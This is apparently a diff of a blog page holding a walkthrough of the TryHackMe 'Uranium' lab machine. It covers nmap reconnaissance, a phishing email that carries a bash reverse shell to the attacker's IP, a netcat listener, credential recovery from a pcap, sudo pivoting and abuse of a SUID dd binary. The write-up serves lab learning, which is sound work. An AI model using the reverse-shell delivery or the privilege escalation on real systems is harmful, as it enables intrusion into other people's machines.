@@ -3,11 +3,10 @@
 <title>
 Uranium CTF - Write Up ::
 Lanfran02 - Blog — Where write-ups are made.
-</title>
-<meta charset=utf-8>
+</title><meta charset=utf-8>
 <meta name=viewport content="width=device-width,initial-scale=1">
 <meta name=description content="Link Level Creator     Here Hard hakanbey01    Reconn As in every CTF, we ran YAAS to get information about the machine.
-__ _____ ___ _____ \ \/ / | / | / ___/ \  / /| | / /| | \__ \  Yet Another Automation Script / / ___ |/ ___ |___/ / Version 1.1 LOCAL /_/_/ |_/_/ |_/____/ -By Lanfran02 (https://github.">
+__ _____ ___ _____ \ \/ / | / | / ___/  \  / /| | / /| | \__ \  Yet Another Automation Script  / / ___ |/ ___ |___/ / Version 1.1 LOCAL /_/_/ |_/_/ |_/____/ -By Lanfran02 	(https://github.">
 <meta name=keywords content="CTF,Writeup,Hacking">
 <meta name=robots content="noodp">
 <link rel=canonical href=/posts/uranium_ctf/>
@@ -33,11 +32,10 @@ __ _____ ___ _____ \ \/ / | / | / ___/ \  / /| | / /| | \__ \  Yet Another Autom
 <meta property="article:modified_time" content="2021-08-21T13:42:51+02:00"><meta property="og:site_name" content="Lanfran02 - Blog">
 <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9309562477773018" crossorigin=anonymous></script>
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
-<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-3T7DYCWC0W',{anonymize_ip:!1})}</script>
-<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','G-3T7DYCWC0W','auto'),ga('send','pageview'))</script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-3T7DYCWC0W",{anonymize_ip:!1})}</script>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","G-3T7DYCWC0W","auto"),ga("send","pageview"))</script>
 <script async src=https://www.google-analytics.com/analytics.js></script>
-</head>
-<body class=dark-theme>
+</head><body class=dark-theme>
 <div class=container>
 <header class=header>
 <span class=header__inner>
@@ -50,45 +48,28 @@ __ _____ ___ _____ \ \/ / | / | / ___/ \  / /| | / /| | \__ \  Yet Another Autom
 <span class=header__right>
 <nav class=menu>
 <ul class="menu__inner menu__inner--desktop">
-<li><a href=/about>About</a></li>
-<li><a href=/es/>Español</a></li>
-<ul class=menu__sub-inner>
+<li><a href=/about>About</a></li><li><a href=/es/>Español</a></li><ul class=menu__sub-inner>
 <li class=menu__sub-inner-more-trigger>
 Write Ups
 <span class=menu__sub-inner-more-trigger-icon><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
 </span>
-</li>
-<ul class="menu__sub-inner-more hidden">
-<li><a href=/tags/hackthebox/>HTB</a></li>
-<li><a href=/tags/tryhackme/>THM</a></li>
-</ul>
-</ul>
-</ul>
-<ul class="menu__inner menu__inner--mobile">
-<li><a href=/about>About</a></li>
-<li><a href=/es/>Español</a></li>
-<li><a href=/tags/hackthebox/>HTB</a></li>
-<li><a href=/tags/tryhackme/>THM</a></li>
-</ul>
-</nav>
-<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
+</li><ul class="menu__sub-inner-more hidden">
+<li><a href=/tags/hackthebox/>HTB</a></li><li><a href=/tags/tryhackme/>THM</a></li></ul></ul></ul><ul class="menu__inner menu__inner--mobile">
+<li><a href=/about>About</a></li><li><a href=/es/>Español</a></li><li><a href=/tags/hackthebox/>HTB</a></li><li><a href=/tags/tryhackme/>THM</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
 </span>
 <span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg>
 </span>
 </span>
 </span>
-</header>
-<div class=content>
+</header><div class=content>
 <div class=post>
-<h1 class=post-title>Uranium CTF - Write Up</h1>
-<div class=post-meta>
+<h1 class=post-title>Uranium CTF - Write Up</h1><div class=post-meta>
 <span class=post-date>
 2021-08-21
 </span>
 <span class=post-author>— Written by Lanfran02</span>
 <span class=post-read-time>— 8 min read</span>
-</div>
-<span class=post-tags>
+</div><span class=post-tags>
 <a href=/tags/phising/>#Phising</a>&nbsp;
 <a href=/tags/suid/>#SUID</a>&nbsp;
 <a href=/tags/nc/>#nc</a>&nbsp;
@@ -98,296 +79,246 @@ Write Ups
 </span>
 <figure class=post-cover>
 <img src=/posts/uranium_ctf/cover.jpeg alt="Uranium CTF - Write Up">
-</figure>
-<div class=post-content>
-<h2>Table of Contents</h2>
-<aside class=table-of-contents><nav id=TableOfContents>
+</figure><div class=post-content>
+<h2>Table of Contents</h2><aside class=table-of-contents><nav id=TableOfContents>
 <ul>
-<li><a href=#reconn>Reconn</a></li>
-<li><a href=#foothold---users>Foothold - Users</a></li>
-<li><a href=#root>Root</a></li>
-</ul>
-</nav></aside>
-<table>
+<li><a href=#reconn>Reconn</a></li><li><a href=#foothold---users>Foothold - Users</a></li><li><a href=#root>Root</a></li></ul></nav></aside><table>
 <thead>
 <tr>
-<th>Link</th>
-<th>Level</th>
-<th>Creator</th>
-</tr>
-</thead>
-<tbody>
+<th>Link</th><th>Level</th><th>Creator</th></tr></thead><tbody>
 <tr>
-<td><a href=https://tryhackme.com/room/uranium>Here</a></td>
-<td>Hard</td>
-<td><a href=https://tryhackme.com/p/hakanbey01>hakanbey01</a></td>
-</tr>
-</tbody>
-</table>
-<h2 id=reconn>Reconn</h2>
-<p>As in every CTF, we ran <a href=https://github.com/lanfran02/YAAS>YAAS</a> to get information about the machine.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>__  _____    ___   _____
-<span style=color:#ae81ff>\ \/</span> /   |  /   | / ___/
- <span style=color:#ae81ff>\ </span> / /| | / /| | <span style=color:#ae81ff>\_</span>_ <span style=color:#ae81ff>\ </span> Yet Another Automation Script
- / / ___ |/ ___ |___/ /  Version 1.1 LOCAL
-/_/_/  |_/_/  |_/____/   -By Lanfran02
-			 <span style=color:#f92672>(</span>https://github.com/lanfran02/YAAS<span style=color:#f92672>)</span>
-
- ----------------
-|                |
-| Final output:  |
-|                |
- ----------------
-<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Tun0 IP             :  10.9.1.53
-<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Machine IP          :  10.10.193.48
-<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Created Files       :  Nmap Result <span style=color:#f92672>(</span>nmap_Scan<span style=color:#f92672>)</span>
-<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Open Port/s         :  22,25,80
-<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> SSH Server/s found? :  YES
-<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> FTP Server/s found? :  NO
-<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Web Server/s found? :  YES
-<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Samba Server found? :  NO
-</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># Nmap 7.91 scan initiated Sat Aug 21 13:43:15 2021 as: nmap -sS -sV -sC -p 22,25,80 -o nmap_Scan 10.10.193.48</span>
-Nmap scan report <span style=color:#66d9ef>for</span> 10.10.193.48
-Host is up <span style=color:#f92672>(</span>0.055s latency<span style=color:#f92672>)</span>.
-
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
-| ssh-hostkey: 
-|   <span style=color:#ae81ff>2048</span> a1:3c:d7:e9:d0:85:40:33:d5:07:16:32:08:63:31:05 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
-|   <span style=color:#ae81ff>256</span> 24:81:0c:3a:91:55:a0:65:9e:36:58:71:51:13:6c:34 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
-|_  <span style=color:#ae81ff>256</span> c2:94:2b:0d:8e:a9:53:f6:ef:34:db:f1:43:6c:c1:7e <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
-25/tcp open  smtp    Postfix smtpd
-|_smtp-commands: uranium, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
-| ssl-cert: Subject: commonName<span style=color:#f92672>=</span>uranium
-| Subject Alternative Name: DNS:uranium
-| Not valid before: 2021-04-09T21:40:53
-|_Not valid after:  2031-04-07T21:40:53
-|_ssl-date: TLS randomness does not represent time
-80/tcp open  http    Apache httpd 2.4.29 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
-|_http-server-header: Apache/2.4.29 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
-|_http-title: Site doesn<span style=color:#960050;background-color:#1e0010>&#39;</span>t have a title <span style=color:#f92672>(</span>text/html<span style=color:#f92672>)</span>.
-Service Info: Host:  uranium; OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-<span style=color:#75715e># Nmap done at Sat Aug 21 13:43:46 2021 -- 1 IP address (1 host up) scanned in 30.56 seconds</span>
-</code></pre></div><p>So, we have an <code>smtp</code> server runnin, a <code>web</code> server and a <code>ssh</code> service running.</p>
-<p>But the creator give us a twitter account, so let&rsquo;s recon it too!</p>
-<p>Reading the twitter, we get some information&mldr;
-<img src=recon.png alt=recon></p>
-<ol>
-<li>We have now a domain and an email.</li>
-<li>We know that the user opens the mail&rsquo;s content in his terminal and expects a file with the name &ldquo;application&rdquo;.</li>
-</ol>
-<h2 id=foothold---users>Foothold - Users</h2>
-<p>What if we send an email with an &ldquo;application&rdquo; with a reverse shell??</p>
-<p>You can get the reverse shell from this site <a href=https://www.revshells.com/>revshells</a></p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ cat application                                                                                                ─╯
-<span style=color:#75715e>#!/bin/bash</span>
-bash -c <span style=color:#e6db74>&#34;bash -i &gt;&amp; /dev/tcp/10.9.1.53/1337 0&gt;&amp;1&#34;</span>
-</code></pre></div><p>Let&rsquo;s send the email now!</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ sendEmail -t hakanbey@uranium.thm -f lanfran@mail.com -s 10.10.105.19 -u <span style=color:#e6db74>&#34;Im an exploit :)&#34;</span> -m <span style=color:#e6db74>&#34;Im gonna hack you&#34;</span> -a application -o tls<span style=color:#f92672>=</span>no
-Aug <span style=color:#ae81ff>21</span> 12:50:21 parrot sendEmail<span style=color:#f92672>[</span>1992588<span style=color:#f92672>]</span>: Email was sent successfully!
-</code></pre></div><p>And after some seconds we get a reverse shell with the user hakanbey!!</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ nc -nlvp <span style=color:#ae81ff>1337</span>                                                                                                                       ─╯
-listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>1337</span> ...
-connect to <span style=color:#f92672>[</span>10.9.1.54<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.105.19<span style=color:#f92672>]</span> <span style=color:#ae81ff>48468</span>
-bash: cannot set terminal process group <span style=color:#f92672>(</span>1494<span style=color:#f92672>)</span>: Inappropriate ioctl <span style=color:#66d9ef>for</span> device
-bash: no job control in this shell
-hakanbey@uranium:~$ ls
-chat_with_kral4  mail_file  user_1.txt
-hakanbey@uranium:~$ cat user_1.txt 
-thm<span style=color:#f92672>{[</span>REDACTED<span style=color:#f92672>]}</span>
-</code></pre></div><p>We can read the flag from the user_1!</p>
-<p>Here comes the second part of the recon :)</p>
-<p>After digging all arround the machine&mldr;</p>
-<p>We foud a pcap file, so I downloaded and read it with wireshark</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>hakanbey@uranium:~$ find / -name *.pcap 2&gt; /dev/null 
-/var/log/hakanbey_network_log.pcap
-</code></pre></div><p>This is a log from a communication and we have a plain text password!</p>
-<p><img src=password.png alt=password></p>
-<p>Perfect!! We have the password to start the chat binary!</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>hakanbey@uranium:~$ ./chat_with_kral4 
-PASSWORD :<span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
-kral4:hi hakanbey
-
--&gt;hi
-hakanbey:hi
-kral4:how are you?
-
--&gt;fine and you ?
-hakanbey:fine and you ?
-kral4:what now? did you forgot your password again
-
--&gt;yes
-hakanbey:yes
-kral4:okay your password is <span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span> don<span style=color:#960050;background-color:#1e0010>&#39;</span>t lose it PLEASE
-kral4:i have to go
-kral4 disconnected
-
-connection terminated
-hakanbey@uranium:~$ sudo -l 
-<span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> hakanbey: 
-Matching Defaults entries <span style=color:#66d9ef>for</span> hakanbey on uranium:
-    env_reset,
-    secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin<span style=color:#ae81ff>\:</span>/snap/bin
-
-User hakanbey may run the following commands on uranium:
-    <span style=color:#f92672>(</span>kral4<span style=color:#f92672>)</span> /bin/bash
-hakanbey@uranium:~$ 
-</code></pre></div><p>So we can now <code>sudo</code> into kral4 and read the flag!</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>hakanbey@uranium:~$ sudo -u kral4 /bin/bash
-kral4@uranium:~$ id
-uid<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>kral4<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>kral4<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>kral4<span style=color:#f92672>)</span>
-kral4@uranium:~$ cat /home/kral4/user_2.txt 
-thm<span style=color:#f92672>{[</span>REDACTED<span style=color:#f92672>]}</span>
-</code></pre></div><h2 id=root>Root</h2>
-<p>After using <code>LinPeas</code> I found the mail folder for our user, with one interesting mail on it.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>kral4@uranium:/home/kral4$ cd /var/mail
-kral4@uranium:/var/mail$ ls
-hakanbey  kral4
-kral4@uranium:/var/mail$ cat kral4 
-From root@uranium.thm  Sat Apr <span style=color:#ae81ff>24</span> 13:22:02 <span style=color:#ae81ff>2021</span>
-Return-Path: &lt;root@uranium.thm&gt;
-X-Original-To: kral4@uranium.thm
-Delivered-To: kral4@uranium.thm
-Received: from uranium <span style=color:#f92672>(</span>localhost <span style=color:#f92672>[</span>127.0.0.1<span style=color:#f92672>])</span>
-	by uranium <span style=color:#f92672>(</span>Postfix<span style=color:#f92672>)</span> with ESMTP id C7533401C2
-	<span style=color:#66d9ef>for</span> &lt;kral4@uranium.thm&gt;; Sat, <span style=color:#ae81ff>24</span> Apr <span style=color:#ae81ff>2021</span> 13:22:02 +0000 <span style=color:#f92672>(</span>UTC<span style=color:#f92672>)</span>
-Message-ID: &lt;841530.943147035-sendEmail@uranium&gt;
-From: <span style=color:#e6db74>&#34;root@uranium.thm&#34;</span> &lt;root@uranium.thm&gt;
-To: <span style=color:#e6db74>&#34;kral4@uranium.thm&#34;</span> &lt;kral4@uranium.thm&gt;
-Subject: Hi Kral4
-Date: Sat, <span style=color:#ae81ff>24</span> Apr <span style=color:#ae81ff>2021</span> 13:22:02 +0000
-X-Mailer: sendEmail-1.56
-MIME-Version: 1.0
-Content-Type: multipart/related; boundary<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;----MIME delimiter for sendEmail-992935.514616878&#34;</span>
-
-This is a multi-part message in MIME format. To properly display this message you need a MIME-Version 1.0 compliant Email program.
-
-------MIME delimiter <span style=color:#66d9ef>for</span> sendEmail-992935.514616878
-Content-Type: text/plain;
-        charset<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;iso-8859-1&#34;</span>
-Content-Transfer-Encoding: 7bit
-
-I give SUID to the nano file in your home folder to fix the attack on our  index.html. Keep the nano there, in <span style=color:#66d9ef>case</span> it happens again.
-
-------MIME delimiter <span style=color:#66d9ef>for</span> sendEmail-992935.514616878--
-</code></pre></div><p>What we know so far, the <code>root</code> user sent an email to <code>kral4</code> saying that &ldquo;if we get an attack again, I will give <code>SUID</code> to the <code>nano</code> binary in your home folder&rdquo;.</p>
-<p>After that I searched for <code>SUID</code> binaries, and I found a very interesting one&mldr;</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>-perm /4000 -type f -exec ls -ld <span style=color:#f92672>{}</span> <span style=color:#ae81ff>\;</span> 2&gt;/dev/null
--rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>113528</span> Feb  <span style=color:#ae81ff>2</span>  <span style=color:#ae81ff>2021</span> /usr/lib/snapd/snap-confine
--rwsr-xr-- <span style=color:#ae81ff>1</span> root messagebus <span style=color:#ae81ff>42992</span> Jun <span style=color:#ae81ff>11</span>  <span style=color:#ae81ff>2020</span> /usr/lib/dbus-1.0/dbus-daemon-launch-helper
--rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>436552</span> Mar  <span style=color:#ae81ff>4</span>  <span style=color:#ae81ff>2019</span> /usr/lib/openssh/ssh-keysign
--rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>14328</span> Mar <span style=color:#ae81ff>27</span>  <span style=color:#ae81ff>2019</span> /usr/lib/policykit-1/polkit-agent-helper-1
--rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>10232</span> Mar <span style=color:#ae81ff>28</span>  <span style=color:#ae81ff>2017</span> /usr/lib/eject/dmcrypt-get-device
--rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>100760</span> Nov <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2018</span> /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
--rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>22520</span> Mar <span style=color:#ae81ff>27</span>  <span style=color:#ae81ff>2019</span> /usr/bin/pkexec
--rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>75824</span> Mar <span style=color:#ae81ff>22</span>  <span style=color:#ae81ff>2019</span> /usr/bin/gpasswd
--rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>40344</span> Mar <span style=color:#ae81ff>22</span>  <span style=color:#ae81ff>2019</span> /usr/bin/newgrp
--rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>59640</span> Mar <span style=color:#ae81ff>22</span>  <span style=color:#ae81ff>2019</span> /usr/bin/passwd
--rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>37136</span> Mar <span style=color:#ae81ff>22</span>  <span style=color:#ae81ff>2019</span> /usr/bin/newuidmap
--rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>44528</span> Mar <span style=color:#ae81ff>22</span>  <span style=color:#ae81ff>2019</span> /usr/bin/chsh
--rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>18448</span> Jun <span style=color:#ae81ff>28</span>  <span style=color:#ae81ff>2019</span> /usr/bin/traceroute6.iputils
--rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>37136</span> Mar <span style=color:#ae81ff>22</span>  <span style=color:#ae81ff>2019</span> /usr/bin/newgidmap
--rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>76496</span> Mar <span style=color:#ae81ff>22</span>  <span style=color:#ae81ff>2019</span> /usr/bin/chfn
--rwsr-sr-x <span style=color:#ae81ff>1</span> daemon daemon <span style=color:#ae81ff>51464</span> Feb <span style=color:#ae81ff>20</span>  <span style=color:#ae81ff>2018</span> /usr/bin/at
--rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>149080</span> Jan <span style=color:#ae81ff>19</span>  <span style=color:#ae81ff>2021</span> /usr/bin/sudo
--rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>26696</span> Sep <span style=color:#ae81ff>16</span>  <span style=color:#ae81ff>2020</span> /bin/umount
--rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>64424</span> Jun <span style=color:#ae81ff>28</span>  <span style=color:#ae81ff>2019</span> /bin/ping
--rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>44664</span> Mar <span style=color:#ae81ff>22</span>  <span style=color:#ae81ff>2019</span> /bin/su
--rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>30800</span> Aug <span style=color:#ae81ff>11</span>  <span style=color:#ae81ff>2016</span> /bin/fusermount
--rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>43088</span> Sep <span style=color:#ae81ff>16</span>  <span style=color:#ae81ff>2020</span> /bin/mount
--rwsr-x--- <span style=color:#ae81ff>1</span> web kral4 <span style=color:#ae81ff>76000</span> Apr <span style=color:#ae81ff>23</span> 10:52 /bin/dd
-</code></pre></div><p><code>dd</code> It&rsquo;s used to write data to files, sooo&mldr;.</p>
-<p>We can use it to modify the index. Here it&rsquo;s the <a href=https://gtfobins.github.io/gtfobins/dd/>GTFOBins page to exploit it</a>.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>kral4@uranium:/home/kral4$ LFILE<span style=color:#f92672>=</span>/var/www/html/index.html 
-kral4@uranium:/home/kral4$ echo <span style=color:#e6db74>&#34;Dumped by lanfran02&#34;</span> | /bin/dd of<span style=color:#f92672>=</span>$LFILE
-0+1 records in
-0+1 records out
-<span style=color:#ae81ff>20</span> bytes copied, 0.000148921 s, <span style=color:#ae81ff>134</span> kB/s
-kral4@uranium:/home/kral4$ cat /var/mail/kral4                           
-From root@uranium.thm  Sat Apr <span style=color:#ae81ff>24</span> 13:22:02 <span style=color:#ae81ff>2021</span>
-Return-Path: &lt;root@uranium.thm&gt;
-X-Original-To: kral4@uranium.thm
-Delivered-To: kral4@uranium.thm
-Received: from uranium <span style=color:#f92672>(</span>localhost <span style=color:#f92672>[</span>127.0.0.1<span style=color:#f92672>])</span>
-	by uranium <span style=color:#f92672>(</span>Postfix<span style=color:#f92672>)</span> with ESMTP id C7533401C2
-	<span style=color:#66d9ef>for</span> &lt;kral4@uranium.thm&gt;; Sat, <span style=color:#ae81ff>24</span> Apr <span style=color:#ae81ff>2021</span> 13:22:02 +0000 <span style=color:#f92672>(</span>UTC<span style=color:#f92672>)</span>
-Message-ID: &lt;841530.943147035-sendEmail@uranium&gt;
-From: <span style=color:#e6db74>&#34;root@uranium.thm&#34;</span> &lt;root@uranium.thm&gt;
-To: <span style=color:#e6db74>&#34;kral4@uranium.thm&#34;</span> &lt;kral4@uranium.thm&gt;
-Subject: Hi Kral4
-Date: Sat, <span style=color:#ae81ff>24</span> Apr <span style=color:#ae81ff>2021</span> 13:22:02 +0000
-X-Mailer: sendEmail-1.56
-MIME-Version: 1.0
-Content-Type: multipart/related; boundary<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;----MIME delimiter for sendEmail-992935.514616878&#34;</span>
-
-This is a multi-part message in MIME format. To properly display this message you need a MIME-Version 1.0 compliant Email program.
-
-------MIME delimiter <span style=color:#66d9ef>for</span> sendEmail-992935.514616878
-Content-Type: text/plain;
-        charset<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;iso-8859-1&#34;</span>
-Content-Transfer-Encoding: 7bit
-
-I give SUID to the nano file in your home folder to fix the attack on our  index.html. Keep the nano there, in <span style=color:#66d9ef>case</span> it happens again.
-
-------MIME delimiter <span style=color:#66d9ef>for</span> sendEmail-992935.514616878--
-
-
-From root@uranium.thm  Sat Aug <span style=color:#ae81ff>21</span> 11:25:17 <span style=color:#ae81ff>2021</span>
-Return-Path: &lt;root@uranium.thm&gt;
-X-Original-To: kral4@uranium.thm
-Delivered-To: kral4@uranium.thm
-Received: from uranium <span style=color:#f92672>(</span>localhost <span style=color:#f92672>[</span>127.0.0.1<span style=color:#f92672>])</span>
-	by uranium <span style=color:#f92672>(</span>Postfix<span style=color:#f92672>)</span> with ESMTP id A476F401A5
-	<span style=color:#66d9ef>for</span> &lt;kral4@uranium.thm&gt;; Sat, <span style=color:#ae81ff>21</span> Aug <span style=color:#ae81ff>2021</span> 11:25:17 +0000 <span style=color:#f92672>(</span>UTC<span style=color:#f92672>)</span>
-Message-ID: &lt;35569.014816673-sendEmail@uranium&gt;
-From: <span style=color:#e6db74>&#34;root@uranium.thm&#34;</span> &lt;root@uranium.thm&gt;
-To: <span style=color:#e6db74>&#34;kral4@uranium.thm&#34;</span> &lt;kral4@uranium.thm&gt;
-Subject: Hi Kral4
-Date: Sat, <span style=color:#ae81ff>21</span> Aug <span style=color:#ae81ff>2021</span> 11:25:17 +0000
-X-Mailer: sendEmail-1.56
-MIME-Version: 1.0
-Content-Type: multipart/related; boundary<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;----MIME delimiter for sendEmail-939019.459839077&#34;</span>
-
-This is a multi-part message in MIME format. To properly display this message you need a MIME-Version 1.0 compliant Email program.
-
-------MIME delimiter <span style=color:#66d9ef>for</span> sendEmail-939019.459839077
-Content-Type: text/plain;
-        charset<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;iso-8859-1&#34;</span>
-Content-Transfer-Encoding: 7bit
-
-I think our index page has been hacked again. You know how to fix it, I am giving authorization.
-
-------MIME delimiter <span style=color:#66d9ef>for</span> sendEmail-939019.459839077--
-
-
-kral4@uranium:/home/kral4$ ls -la
-total <span style=color:#ae81ff>384</span>
-drwxr-x--- <span style=color:#ae81ff>3</span> kral4 kral4   <span style=color:#ae81ff>4096</span> Aug <span style=color:#ae81ff>21</span> 11:40 .
-drwxr-xr-x <span style=color:#ae81ff>4</span> root  root    <span style=color:#ae81ff>4096</span> Apr <span style=color:#ae81ff>23</span> 08:50 ..
-lrwxrwxrwx <span style=color:#ae81ff>1</span> root  root       <span style=color:#ae81ff>9</span> Apr <span style=color:#ae81ff>25</span> 11:12 .bash_history -&gt; /dev/null
--rw-r--r-- <span style=color:#ae81ff>1</span> kral4 kral4    <span style=color:#ae81ff>220</span> Apr  <span style=color:#ae81ff>9</span> 21:55 .bash_logout
--rw-r--r-- <span style=color:#ae81ff>1</span> kral4 kral4   <span style=color:#ae81ff>3771</span> Apr  <span style=color:#ae81ff>9</span> 21:55 .bashrc
--rwxr-xr-x <span style=color:#ae81ff>1</span> kral4 kral4 <span style=color:#ae81ff>109960</span> Apr  <span style=color:#ae81ff>9</span> 16:35 chat_with_hakanbey
--rw-r--r-- <span style=color:#ae81ff>1</span> kral4 kral4      <span style=color:#ae81ff>5</span> Apr <span style=color:#ae81ff>23</span> 14:03 .check
-drwxrwxr-x <span style=color:#ae81ff>3</span> kral4 kral4   <span style=color:#ae81ff>4096</span> Apr <span style=color:#ae81ff>10</span> 00:21 .local
